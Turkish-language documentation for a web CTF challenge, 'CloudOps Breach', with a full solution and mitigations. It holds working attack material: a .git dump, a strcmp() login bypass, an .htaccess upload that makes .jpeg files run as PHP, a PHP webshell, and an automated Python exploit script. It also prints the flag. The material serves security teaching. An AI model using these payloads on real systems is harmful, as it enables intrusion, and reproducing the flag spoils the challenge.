# CloudOps Breach - CTF Challenge Dokumantasyonu

## 1. Soru Meta Verileri

**Soru Adi:** CloudOps Breach

**Kategori:** Web

**Zorluk:** Medium-Hard

**Bayrak:** `SKYDAYS{g1t_l34k_2_rc3!}`

---

## 2. Soru Mimarisi

### 2.1 Teknik Altyapi

Bu CTF sorusu, kurumsal bir DevOps portal uygulamasini simule eden bir web guvenlik senaryosudur. Sistem asagidaki teknik bilesenlerden olusmaktadir:

#### Calisma Zamani Ortami
- **Platform:** PHP 7.2-Apache (Official Docker Image)
- **Web Sunucu:** Apache HTTP Server
- **Konteynerizasyon:** Docker ve Docker Compose
- **Isletim Sistemi:** Debian-based Linux (PHP official image uzerine kurulu)

#### PHP Yapilandirmasi
Dockerfile icinde asagidaki kritik yapilandirmalar aktif edilmistir:

```dockerfile
# Apache AllowOverride direktifi etkinlestirildi (.htaccess desteği icin)
AllowOverride All

# PHP short_open_tag aktif (<?  syntax desteği icin)
short_open_tag = On
```

Bu yapilandirmalar, saldirganin `.htaccess` dosyasi yukleme ve PHP short open tag (`<? ?>`) syntax'i kullanarak payload calistirmasina olanak tanir.

#### Dosya Sistemi Yapisi
```
/var/www/html/              # Web root dizini
├── .git/                   # Git repository metadata (IFSA VEKTORU)
├── login.php               # Kimlik dogrulama endpoint'i (ZAFIYET 1)
├── pages/
│   ├── dashboard.php       # Ana panel
│   ├── documents.php       # Dosya yukleme endpoint'i (ZAFIYET 2)
│   ├── logs.php            # Log goruntuleme
│   └── profile.php         # Kullanici profil
├── includes/
│   ├── config.php          # Session yonetimi
│   ├── header.php          # UI header
│   └── footer.php          # UI footer
├── uploads/                # Dosya yukleme dizini (0777 permission)
│   └── {SESSION_ID}/       # Kullanici bazli izole klasorler
└── /flag.txt               # Hedef bayrak dosyasi (root seviyesinde)
```

### 2.2 Izolasyon Mekanizmasi

Bu sorunun en kritik mimari bileseni, `pages/documents.php` dosyasinda implement edilen session-based izolasyon mekanizmasidir. Bu mekanizma, ayni anda coklu katilimcinin challenge'i cozerken birbirlerinin dosyalarina erisimini onlemek ve istenmeyen cross-contamination durumlarini engellemek icin tasarlanmistir.

#### Izolasyon Implementasyonu

```php
// documents.php - Line 12-13
$sessionId = session_id();
$userUploadDir = "../uploads/" . $sessionId;
```

Her kullanici icin benzersiz bir session ID (`PHPSESSID` cookie) uretilir ve bu ID, kullaniciya ozel bir upload dizini olusturmak icin kullanilir.

#### Izolasyonun Calisma Prensibi

1. **Session Baslangici:** Kullanici login oldugunda, PHP `session_start()` cagrisi ile yeni bir session olusturur ve benzersiz bir session ID uretir (ornek: `a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9`).

2. **Dinamik Dizin Olusumu:** Her dosya yukleme isleminde, sistem kullanicinin session ID'sini alir ve ona ozel bir dizin olusturur:
   ```
   /var/www/html/uploads/a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9/
   ```

3. **Izole Depolama:** Tum yuklemeler bu izole dizine kaydedilir:
   ```php
   // documents.php - Line 40
   $upload_path = $userUploadDir . "/" . $filename;
   move_uploaded_file($file["tmp_name"], $upload_path);
   ```

4. **Izole Okuma:** Dosya listesi cekme islemi de yalnizca kullanicinin kendi dizinini tarar:
   ```php
   // documents.php - Line 55-56
   if (is_dir($userUploadDir)) {
       $files = scandir($userUploadDir);
   ```

#### Izolasyon Mekanizmasinin Amaci

Bu mimari tasarim su kritik problemleri cozer:

- **Cozum Carpismalari Onleme:** Player A'nin yuklediği shell.jpeg dosyasi, Player B'nin cozumunu etkilemez.
- **Bayrak Okunabilirlik Garantisi:** Her oyuncu kendi session'inda RCE elde ettiginde `/flag.txt` dosyasini okuyabilir.
- **Gercekci Senaryo:** Gercek dunyada coklu tenant sistemlerde gorulebilegecek bir izolasyon modeli.
- **CTF Platformu Uyumlulugu:** Ayni Docker container uzerinde yuzlerce kullanicinin esanli olarak challenge'i cozmesi mumkun olur.

#### Guvenlik Etkileri

Izolasyon mekanizmasi saldiri yuzeyini degistirmez ancak saldirganin belli bir davranis sekli benimsemesini gerektirir:

1. Saldirgan kendi session'inda authentication bypass yapmalidir.
2. Yukledigi payload'lara erisirken kendi session ID'sini bilmelidir.
3. Payload URL yapisi: `http://target/uploads/{PHPSESSID}/shell.jpeg`

Bu, challenge'in realism seviyesini artirir ve katilimcilarin session management kavramlarini anlamasini saglar.

### 2.3 Deployment Yapisi

Uygulama Docker Compose kullanilarak deploy edilmektedir:

```yaml
services:
  CloudOps-Breach:
    container_name: CloudOps-Breach
    build: .
    restart: unless-stopped
    networks: 
      - ctf-network
```

Container, ctf-network adli external bir network'e bagli olup, diger CTF challenge'lari ile ayni network segment'inde calisir. Port mapping yapilandirmasi, platform tarafindan dinamik olarak yonetilir.

---

## 3. Adim Adim Cozum Yolu

### Asama 1: Kaynak Kod Ifsasi (Source Code Disclosure)

#### 1.1 Keşif Aşaması

Hedef uygulamaya baglanti saglandiktan sonra, standart web uygulama enumeration islemlerine baslanir. Modern web uygulamalarinda en yaygin hatalardan biri, version control system metadata dosyalarinin production ortaminda silinmemesidir.

#### 1.2 .git Dizini Tespiti

Asagidaki HTTP istegi ile `.git` dizininin varligi test edilir:

```bash
curl -I http://target/.git/
```

Sunucu `HTTP/1.1 200 OK` veya `HTTP/1.1 301 Moved Permanently` donuyorsa, `.git` dizini erislebilir durumdadir.

Alternatif olarak, `.git/HEAD` dosyasinin varligi dogrudan kontrol edilebilir:

```bash
curl http://target/.git/HEAD
```

Gecerli bir response ornegi:
```
ref: refs/heads/master
```

Bu durumda, tam bir git repository metadata'si web sunucu uzerinde expose edilmis demektir.

#### 1.3 Git Repository Extraction

`.git` dizini bulunduktan sonra, tam repository icerigi `git-dumper` araci kullanilarak download edilir:

```bash
# git-dumper aracini yukle (eger yoksa)
pip3 install git-dumper

# Repository'yi cek
git-dumper http://target/.git/ ./cloudops-repo
```

`git-dumper` araci, su islemleri gerceklestirir:

1. `.git/HEAD` dosyasini indirip aktif branch'i belirler
2. `.git/objects/` altindaki tum git object'lerini recursive olarak indirir
3. `.git/refs/` altindaki tum referanslari download eder
4. Working directory'yi reconstruct eder

#### 1.4 Repository Icerigi Dogrulama

Extraction tamamlandiktan sonra, repository'nin integrity'si dogrulanir:

```bash
cd cloudops-repo
git status
git log --all --oneline --graph
```

Beklenen commit history:

```
* a3f7d8c Remove hardcoded DB creds
* b2e6c9f Add apache config
* c1d5a8e Add README
* d4e3b7f Add database config
* e5f2c6f Update auth logic
* f6a1d5e Initial commit
```

---

### Asama 2: Kaynak Kod Analizi (Source Code Analysis)

#### 2.1 Commit History Analizi

Git history, gelisim surecini ve potansiyel guvenlik zaaflarini anlamak icin analiz edilir:

```bash
git log --all --oneline --decorate
```

Kritik commit'lere detayli bakis:

```bash
# Her commit'in degisikliklerini incele
git show e5f2c6f  # "Update auth logic" commit'i
git show d4e3b7f  # "Add database config" commit'i
```

#### 2.2 Kritik Bilgi Kesfı - Username

`d4e3b7f` commit'inde eklenen `config.php` dosyasini incelerken asagidaki bilgi tespit edilir:

```php
define('ADMIN_USERNAME', 'skysec');
```

Bu, kimlik dogrulama icin kullanilmasi gereken username bilgisidir.

#### 2.3 Kimlik Dogrulama Mekanizmasi Analizi

`login.php` dosyasinin guncel versiyonu incelendiginde asagidaki kod tespit edilir:

```php
// login.php - Current version
session_start();
$admin_password = bin2hex(random_bytes(16));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    if ($username == "skysec" && strcmp($admin_password, $password) == 0) {
        $_SESSION["logged_in"] = true;
        $_SESSION["username"] = $username;
        header("Location: pages/dashboard.php");
        exit();
    }
}
```

#### 2.4 Zafiyet Tespiti - strcmp() Type Juggling

Kod analizinde asagidaki kritik guvenlik zafiyeti belirlenir:

**Zafiyet Tipi:** PHP Type Juggling / strcmp() NULL Comparison Bypass

**Etkilenen Kod:**
```php
strcmp($admin_password, $password) == 0
```

**Zafiyet Detayi:**

PHP'de `strcmp()` fonksiyonu su davranisi gosterir:

- Normal kullanim: `strcmp(string $str1, string $str2): int`
- Return degeri: 
  - `0` eger stringler esitse
  - `< 0` eger str1 < str2
  - `> 0` eger str1 > str2
  - `NULL` eger parametrelerden biri string degilse

Kritik nokta: Eger `$password` parametresi bir array olarak gonderilirse, `strcmp()` fonksiyonu `NULL` doner ve PHP'de `NULL == 0` karsilastirmasi `true` sonucunu verir.

**Proof of Concept:**

```php
$admin_password = bin2hex(random_bytes(16)); // Random 32 karakter hex string
$password = array();                         // Array

var_dump(strcmp($admin_password, $password)); // NULL
var_dump(strcmp($admin_password, $password) == 0); // bool(true)
```

---

### Asama 3: Kimlik Dogrulama Atlatma (Authentication Bypass)

#### 3.1 Exploitation Stratejisi

Tespit edilen strcmp() zafiyeti kullanilarak authentication bypass gerceklestirilir. Username bilgisi git commit'lerinden elde edilmistir (`skysec`), password ise array gonderilerek bypass edilecektir.

#### 3.2 HTTP Request Construction

POST request olusturulurken, `password` parametresi array syntax'i ile gonderilir:

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=skysec&password[]=1
```

PHP'de `password[]=1` syntax'i, `$_POST['password']` degiskenini bir array yapar:
```php
$_POST['password'] = array(0 => "1");
```

#### 3.3 curl ile Exploitation

```bash
curl -i -X POST http://target/login.php \
  -d "username=skysec" \
  -d "password[]=1" \
  -c cookies.txt
```

Beklenen response:
```http
HTTP/1.1 302 Found
Location: pages/dashboard.php
Set-Cookie: PHPSESSID=a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9; path=/
```

Session cookie'si (`PHPSESSID`) kaydedilir ve sonraki isteklerde kullanilir.

#### 3.4 Authentication Dogrulama

Session'in basarili oldugunu dogrulamak icin dashboard'a erisim test edilir:

```bash
curl -b cookies.txt http://target/pages/dashboard.php
```

Basarili authentication sonrasinda dashboard HTML icerigi doner.

---

### Asama 4: Yukleme Kisitlamalarini Atlatma (Bypassing Upload Restrictions)

#### 4.1 Upload Fonksiyonu Analizi

`pages/documents.php` dosyasinda asagidaki guvenlik kontrolleri implement edilmistir:

```php
// Line 30-32: PHP extension blocking
if (stripos($filename, ".php") !== false) {
    $error = "Security Policy: PHP files are not permitted for upload.";
}

// Line 34-36: PHP tag blocking
elseif (stripos($contents, "<?php") !== false) {
    $error = "Security Policy: File contains prohibited PHP content.";
}
```

**Tespit Edilen Kisitlamalar:**

1. Dosya adi `.php` iceren dosyalar reddedilir (case-insensitive)
2. Dosya icerigi `<?php` tag'i iceren dosyalar reddedilir (case-insensitive)

**Kritik Gozlem:**

- `.php` extension bloklaniyor ancak `.jpeg`, `.jpg`, `.png` gibi extension'lar engellenmemis
- `<?php` tag'i bloklaniyor ancak PHP short open tag (`<?`) bloklama disinda
- Dosya type verification (MIME type, magic bytes) yapilmiyor
- `.htaccess` dosyasi upload'ı kisitlanmamis

#### 4.2 Apache Handler Manipulation Stratejisi

Apache web sunucusunda, `.htaccess` dosyalari kullanilarak directory-level yapilandirma degisiklikleri yapilabilir. Ozellikle `AddType` ve `AddHandler` direktifleri ile, belirli extension'lara PHP handler atanabilir.

**Stratejik Plan:**

1. Bir `.htaccess` dosyasi yukleyerek `.jpeg` extension'ina PHP handler ata
2. PHP short open tag iceren bir `.jpeg` payload yukle
3. Payload'a HTTP istegi gonder ve RCE elde et

#### 4.3 .htaccess Payload Olusturma

`.htaccess` dosyasi asagidaki directive'i icermelidir:

```apache
AddType application/x-httpd-php .jpeg
```

Bu directive, Apache'ye `.jpeg` extension'li dosyalari PHP script olarak execute etmesini soyler.

Dosya olusturma:

```bash
echo 'AddType application/x-httpd-php .jpeg' > .htaccess
```

#### 4.4 .htaccess Upload İşlemi

```bash
curl -X POST http://target/pages/documents.php \
  -b cookies.txt \
  -F "file=@.htaccess"
```

Basarili upload sonrasi, `.htaccess` dosyasi user-specific upload directory'ye kaydedilir:
```
/var/www/html/uploads/{SESSION_ID}/.htaccess
```

Apache artik bu dizindeki `.jpeg` dosyalarini PHP olarak calistiracaktir.

#### 4.5 PHP Payload Hazirlama

`.php` extension ve `<?php` tag'i engellendigi icin, asagidaki kosuller saglanan bir payload gereklidir:

- Extension: `.jpeg` (veya baska bir PHP olmayan extension)
- PHP Syntax: Short open tag (`<?`) kullanilmali (Dockerfile'da `short_open_tag = On`)
- Fonksiyonellik: System command execution capability

**Payload:**

```php
<? system($_GET['cmd']); ?>
```

Dosya olusturma:

```bash
echo '<? system($_GET["cmd"]); ?>' > shell.jpeg
```

**Alternatif Payload (daha verbose):**

```php
<? 
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

#### 4.6 Payload Upload

```bash
curl -X POST http://target/pages/documents.php \
  -b cookies.txt \
  -F "file=@shell.jpeg"
```

Response, upload edilen dosyanin URL'ini icerir:
```html
Document uploaded successfully! <a href='../uploads/a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9/shell.jpeg'>View document</a>
```

---

### Asama 5: Uzaktan Kod Calistirma (Remote Code Execution - RCE)

#### 5.1 Session ID Belirleme

Yukledigi dosyalara erisebilmek icin saldirgan kendi session ID'sini bilmelidir. Session ID, browser cookie'sinden veya upload success mesajindaki URL'den extract edilebilir.

**Yontem 1: Cookie'den Okuma**

```bash
cat cookies.txt | grep PHPSESSID
```

Output:
```
target    FALSE    /    FALSE    0    PHPSESSID    a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9
```

**Yontem 2: Upload Response Parsing**

Upload success mesajindaki URL structure:
```
../uploads/a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9/shell.jpeg
```

Session ID: `a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9`

#### 5.2 RCE Verification

Payload'a erisim ve komut calistirma testi:

```bash
curl "http://target/uploads/a3f7d8c9e2b1f4a6d8c9e2b1f4a6d8c9/shell.jpeg?cmd=whoami"
```

Beklenen output:
```
www-data
```

Bu, RCE'nin basarili oldugunu dogrular. Web sunucu `www-data` kullanicisi olarak komut calistirmaktadir.

#### 5.3 System Enumeration

```bash
# Sistem bilgisi
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=uname+-a"

# Mevcut dizin
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=pwd"

# Root dizin icerigi
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=ls+-la+/"
```

#### 5.4 Flag Extraction

Bayrak dosyasi Dockerfile'da `/flag.txt` konumuna kopyalanmistir:

```dockerfile
COPY flag.txt /flag.txt
```

Flag okuma komutu:

```bash
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=cat+/flag.txt"
```

**Output:**
```
SKYDAYS{g1t_l34k_2_rc3!}
```

#### 5.5 Alternatif Flag Okuma Yontemleri

```bash
# Base64 encoding ile okuma (ozel karakterleri onlemek icin)
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=cat+/flag.txt|base64"

# Hexdump ile okuma
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=xxd+/flag.txt"

# Python ile okuma
curl "http://target/uploads/{SESSION_ID}/shell.jpeg?cmd=python+-c+\"print(open('/flag.txt').read())\""
```

---

## 4. Otomatize Exploit Script

Tum adimlari otomatize eden Python exploit script'i:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

TARGET = "http://target"
SESSION = requests.Session()

def exploit():
    print("[*] CloudOps Breach - Automated Exploit")
    
    # Step 1: Authentication Bypass
    print("[+] Step 1: Bypassing authentication via strcmp() type juggling...")
    login_data = {
        "username": "skysec",
        "password[]": "1"
    }
    r = SESSION.post(urljoin(TARGET, "/login.php"), data=login_data)
    
    if "PHPSESSID" not in SESSION.cookies:
        print("[-] Authentication failed!")
        return
    
    session_id = SESSION.cookies["PHPSESSID"]
    print(f"[+] Authenticated! Session ID: {session_id}")
    
    # Step 2: Upload .htaccess
    print("[+] Step 2: Uploading .htaccess to enable PHP execution on .jpeg files...")
    htaccess_content = b"AddType application/x-httpd-php .jpeg"
    files = {"file": (".htaccess", htaccess_content)}
    r = SESSION.post(urljoin(TARGET, "/pages/documents.php"), files=files)
    
    if "uploaded successfully" not in r.text:
        print("[-] .htaccess upload failed!")
        return
    print("[+] .htaccess uploaded successfully!")
    
    # Step 3: Upload PHP payload
    print("[+] Step 3: Uploading PHP payload as .jpeg file...")
    payload = b'<? system($_GET["cmd"]); ?>'
    files = {"file": ("shell.jpeg", payload)}
    r = SESSION.post(urljoin(TARGET, "/pages/documents.php"), files=files)
    
    if "uploaded successfully" not in r.text:
        print("[-] Payload upload failed!")
        return
    print("[+] Payload uploaded successfully!")
    
    # Step 4: Execute command and get flag
    print("[+] Step 4: Executing command to read /flag.txt...")
    shell_url = f"{TARGET}/uploads/{session_id}/shell.jpeg"
    r = requests.get(shell_url, params={"cmd": "cat /flag.txt"})
    
    flag = r.text.strip()
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    exploit()
```

---

## 5. Guvenlik Zafiyetlerinin Analizi

### 5.1 Zafiyet 1: Git Repository Exposure

**CVSS Score:** 7.5 (High)

**Aciklama:** Production ortaminda `.git` dizininin erislebilir olmasi, kaynak kodun tamamen ifsa olmasina ve potansiyel credential leak'e yol acar.

**Mitigasyon:**
```apache
# .htaccess
<DirectoryMatch "^/.git">
    Require all denied
</DirectoryMatch>
```

### 5.2 Zafiyet 2: PHP Type Juggling - strcmp() Bypass

**CVSS Score:** 9.8 (Critical)

**CWE:** CWE-697 (Incorrect Comparison)

**Aciklama:** `strcmp()` fonksiyonunun NULL donmesi ve loose comparison (`==`) kullanimi, authentication bypass'a yol acar.

**Mitigasyon:**
```php
// Yanlis kullanim
if (strcmp($admin_password, $password) == 0) { ... }

// Dogru kullanim
if (is_string($password) && strcmp($admin_password, $password) === 0) { ... }
```

### 5.3 Zafiyet 3: Arbitrary File Upload + .htaccess Manipulation

**CVSS Score:** 9.9 (Critical)

**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Aciklama:** `.htaccess` dosyasi upload'ina izin verilmesi ve file type validation eksikligi, RCE'ye yol acar.

**Mitigasyon:**
```php
// Blacklist yerine whitelist kullan
$allowed_extensions = ['pdf', 'docx', 'xlsx', 'png', 'jpg'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions)) {
    die("Invalid file type");
}

// .htaccess upload'ini engelle
if (in_array($filename, ['.htaccess', '.htpasswd'])) {
    die("Forbidden file name");
}

// MIME type dogrulama
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file["tmp_name"]);
if (!in_array($mime, $allowed_mimes)) {
    die("Invalid MIME type");
}
```

---

## 6. Ogrenme Ciktilari

Bu CTF challenge'i asagidaki guvenlik konularini ogretir:

1. **Version Control Security:** Production sistemlerinde `.git` dizininin expose edilmemesi gerektigi
2. **PHP Type Juggling:** Loose comparison (`==`) vs strict comparison (`===`) farklari ve type juggling exploitation
3. **File Upload Security:** Extension-based filtering yerine content-based validation gerekliligi
4. **Apache Configuration Security:** `.htaccess` dosyalarinin arbitrary upload edilmemesi gerektigi
5. **Defense in Depth:** Tek bir guvenlik kontrol katmaninin yetersiz oldugu, multiple layer defense gerektigi

---

## 7. Teknik Referanslar

- OWASP Top 10 2021: A01:2021 - Broken Access Control
- OWASP Top 10 2021: A04:2021 - Insecure Design
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-697: Incorrect Comparison
- PHP Manual: strcmp() function behavior with non-string arguments
- Apache Documentation: .htaccess AddType directive security implications
